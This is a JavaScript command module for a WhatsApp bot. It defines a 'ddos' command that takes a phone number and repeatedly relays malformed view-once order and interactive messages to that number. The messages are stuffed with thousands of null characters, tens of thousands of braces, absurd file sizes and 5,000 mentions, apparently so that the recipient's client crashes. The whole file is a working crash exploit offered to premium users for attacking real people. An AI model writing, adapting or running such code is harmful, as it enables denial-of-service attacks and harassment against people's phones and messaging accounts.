import { isPremiumUser } from '../../utils/premiumStore.js';
import axios from 'axios';
export default {
    name: 'ddos',
    aliases: ['ipattack', 'heavycrash'],
    category: 'bug',
    description: 'Heavy crash attack on target (invisible relays)',
    usage: 'ddos <number>',
    cooldown: 60,
    ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ Usage: .ddos <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '🔥', key: message.key } });
        await sock.sendMessage(from, { text: `🔥 DDoS attack on ${num}` }, { quoted: message });
        for (let i = 0; i < 15; i++) {
            try { await sock.relayMessage(t, { viewOnceMessage: { message: { orderMessage: { orderId: "0".repeat(2000), itemCount: 999999, status: "INQUIRY", surface: "BUFFERS", message: "\u0000".repeat(2000), orderTitle: "\u0000".repeat(2000), sellerJid: t, token: "\u0000".repeat(2000) }, messageContextInfo: { deviceListMetadata: {} } } } }, { participant: { jid: t } }); } catch {}
            try { await sock.relayMessage(t, { ephemeralMessage: { message: { interactiveMessage: { header: { title: "\u0000".repeat(3000), hasMediaAttachment: false, documentMessage: { url: "https://crash.pdf", mimetype: "application/pdf", title: "\u0000".repeat(500), fileSize: 999999999999999, pageCount: 99999 } }, body: { text: "\u0000".repeat(3000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(60000) }, contextInfo: { mentionedJid: Array.from({ length: 5000 }, (_, i) => `${i}@s.whatsapp.net`) } } } } }, {}); } catch {}
            await new Promise(r => setTimeout(r, 100));
        }
        await sock.sendMessage(from, { text: '✅ DDoS attack sent (invisible)' }, { quoted: message });
    }
};
